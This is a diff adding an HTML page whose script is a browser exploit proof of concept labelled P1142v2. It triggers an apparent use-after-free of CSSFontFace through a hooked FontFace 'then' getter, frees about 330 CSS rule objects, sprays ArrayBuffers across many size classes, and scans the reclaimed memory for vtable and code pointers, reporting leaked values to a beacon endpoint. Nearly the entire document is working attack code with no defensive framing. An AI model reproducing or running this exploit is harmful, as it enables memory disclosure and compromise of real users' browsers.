@@ -1,0 +1,219 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1142v2</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+log('phase','=== P1142v2: CSS RULE VTABLE HUNT ===');
+log('info','CSSStyleRule is virtual (has vtable at +0)');
+log('info','Free 300 CSS rules + 30 stylesheets, spray multi-size');
+B('P1142V2-START','t='+Date.now());
+
+// ===== PHASE A: Create 30 stylesheets with 10 rules each =====
+// IMPORTANT: Never access st.sheet.cssRules[n] - no JS wrappers = clean refcount
+var styleEls=[];
+for(var s=0;s<30;s++){
+  var st=document.createElement('style');
+  var css='';
+  for(var r=0;r<10;r++){
+    css+='.s'+s+'r'+r+'{color:rgb('+(s*8)+','+(r*25)+',0);font-size:'+(10+r)+'px;';
+    css+='margin:'+(r*2)+'px;padding:'+(r+1)+'px;border:'+r+'px solid #'+s.toString(16)+'00;';
+    css+='display:block;width:'+(50+r*10)+'px;height:'+(20+r*5)+'px}';
+  }
+  st.textContent=css;
+  document.head.appendChild(st);
+  styleEls.push(st);
+}
+document.body.offsetHeight;
+log('ok','Created 30 stylesheets x 10 rules = 300 CSSStyleRule objects');
+
+// Also create 20 @keyframes rules (CSSKeyframesRule = different subclass, different size)
+var animSt=document.createElement('style');
+var animCss='';
+for(var a=0;a<20;a++){
+  animCss+='@keyframes a'+a+'{0%{opacity:0.'+(a%10)+'}50%{transform:scale(1.'+(a%5)+');}100%{opacity:1}}';
+}
+animSt.textContent=animCss;
+document.head.appendChild(animSt);
+styleEls.push(animSt);
+log('ok','Created 20 @keyframes rules');
+
+// Also create 10 @media rules (CSSMediaRule = another subclass)
+var mediaSt=document.createElement('style');
+var mediaCss='';
+for(var m=0;m<10;m++){
+  mediaCss+='@media (min-width:'+(100+m*100)+'px){.m'+m+'{color:blue;font-size:'+(12+m)+'px}}';
+}
+mediaSt.textContent=mediaCss;
+document.head.appendChild(mediaSt);
+styleEls.push(mediaSt);
+log('ok','Created 10 @media rules');
+
+B('P1142V2-CREATED','sheets='+styleEls.length+'|rules=~330');
+
+// ===== PHASE B: Set up CSSFontFace UAF trigger =====
+var r=Date.now()%100000;
+var uafHit=false;
+var allSpray={};
+var SIZES=[32,48,64,80,96,112,128,144,160,176,192,208,224,256,320,384,512];
+for(var si=0;si<SIZES.length;si++) allSpray[SIZES[si]]=[];
+
+var fontSt=document.createElement('style');
+fontSt.textContent="@font-face{font-family:v"+r+";src:local(Arial);unicode-range:U+0042}";
+document.head.appendChild(fontSt);
+var ff=new FontFace('w'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(uafHit)return undefined;uafHit=true;
+
+  // ===== Free ALL stylesheets (300+ CSS rules freed) =====
+  for(var i=0;i<styleEls.length;i++){
+    if(styleEls[i].parentNode) styleEls[i].remove();
+  }
+
+  // Free CSSFontFace
+  if(fontSt.parentNode) fontSt.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+
+  // ===== Multi-size spray =====
+  var PER=50;
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    for(var k=0;k<PER;k++){
+      allSpray[sz].push(new ArrayBuffer(sz));
+    }
+  }
+
+  try{document.fonts.check('1em v'+r);}catch(e){}
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em w'+r+', v'+r,'AB').then(function(){},function(){});
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  // ===== PHASE C: Scan ALL buffers =====
+  log('phase','--- Scanning '+SIZES.length+' size classes ---');
+
+  var totalNZ=0;
+  var vtableHits=[];
+  var otherHits=[];
+  var cffFound=false;
+
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    var bufs=allSpray[sz];
+    var nzCount=0;
+
+    for(var k=0;k<bufs.length;k++){
+      var v=new BigUint64Array(bufs[k]);
+      var hasNZ=false;
+      for(var q=0;q<v.length;q++){if(v[q]!==0n){hasNZ=true;break;}}
+      if(!hasNZ) continue;
+      nzCount++;
+
+      var q0=v[0];
+      var q0hi=Number(q0>>32n);
+
+      // CSSFontFace: sz=192, q0=1 (refcount), q11 is heap ptr
+      if(sz===192&&q0===1n&&v.length>11&&v[11]!==0n){
+        var h11=Number(v[11]>>32n);
+        if(h11>=0x10&&h11<=0xFF){
+          cffFound=true;
+          B('P1142V2-CFF','q11='+hex64(v[11])+'|q13='+hex64(v[13]));
+          log('ok','CSSFontFace: q11='+hex64(v[11]));
+          continue;
+        }
+      }
+
+      // Full dump (first 8 qwords)
+      var dump=[];
+      for(var q=0;q<Math.min(v.length,8);q++){
+        dump.push('q'+q+'='+hex64(v[q]));
+      }
+
+      // Classify q0 for vtable identification
+      // Vtable pointers: NOT zero, NOT small int, NOT heap range (hi=0x10-0xFF)
+      // NOT sentinel (hi>=0xFFFF), typically in code segment
+      var isVtableCandidate=false;
+      if(q0!==0n && q0>0x10000n && q0hi<0x10 && q0<0xFFFF000000000000n){
+        isVtableCandidate=true;
+      }
+
+      // Also check q0=refcount pattern (other RefCounted objects)
+      var isRefCounted=(q0>=1n && q0<=0x1000n);
+
+      // Check ALL qwords for code-range pointers
+      var codeQwords=[];
+      for(var q=0;q<v.length;q++){
+        var val=v[q];
+        if(val===0n) continue;
+        var hi=Number(val>>32n);
+        // Code pointer: hi in 0x01-0x0F (not heap 0x10-0xFF, not sentinel 0xFFFF+)
+        if(hi>=1 && hi<=0xF){
+          codeQwords.push({q:q,val:hex64(val),hi:'0x'+hi.toString(16)});
+        }
+        // Also check for very low pointers that might be code
+        if(hi===0 && Number(val&0xFFFFFFFFn)>=0x100000){
+          codeQwords.push({q:q,val:hex64(val),hi:'0x0'});
+        }
+      }
+
+      if(isVtableCandidate||codeQwords.length>0){
+        vtableHits.push({sz:sz,k:k,q0:hex64(q0),
+          codePtrs:codeQwords.length,dump:dump.join('|')});
+        log('win','VTABLE? sz='+sz+' k='+k+' q0='+hex64(q0)+' codePtrs='+codeQwords.length);
+        log('ptr','  '+dump.join(' '));
+        if(codeQwords.length>0){
+          for(var ci=0;ci<Math.min(codeQwords.length,4);ci++){
+            log('win','  CODE? q'+codeQwords[ci].q+'='+codeQwords[ci].val);
+          }
+        }
+      }else{
+        otherHits.push({sz:sz,k:k,q0:hex64(q0),
+          sample:dump.slice(0,4).join('|')});
+      }
+
+      // Beacon non-zero (limited)
+      if(nzCount<=3){
+        B('P1142V2-NZ-'+sz+'-'+k,dump.join('|'));
+      }
+    }
+
+    if(nzCount>0){
+      totalNZ+=nzCount;
+      log('info','sz='+sz+': '+nzCount+'/'+bufs.length+' non-zero');
+    }
+  }
+
+  // ===== Report =====
+  B('P1142V2-VTABLE','count='+vtableHits.length);
+  for(var i=0;i<Math.min(vtableHits.length,10);i++){
+    B('P1142V2-VT-'+i,JSON.stringify(vtableHits[i]));
+  }
+
+  B('P1142V2-OTHER','count='+otherHits.length);
+  for(var i=0;i<Math.min(otherHits.length,5);i++){
+    B('P1142V2-OT-'+i,JSON.stringify(otherHits[i]));
+  }
+
+  var summary='total_nz='+totalNZ+'|vtable='+vtableHits.length+
+    '|other='+otherHits.length+'|cff='+cffFound;
+  B('P1142V2-DONE',summary);
+  log('phase','=== DONE: '+totalNZ+' non-zero, '+vtableHits.length+' vtable candidates ===');
+
+  if(vtableHits.length>0){
+    log('win','!!! POTENTIAL CODE POINTERS FOUND !!!');
+  }else if(otherHits.length>0){
+    log('info','Non-vtable data found - might be RefCounted objects');
+  }else{
+    log('info','Only CSSFontFace found. CSS rules likely in IsoHeap too.');
+  }
+},20);
+</script></body></html>
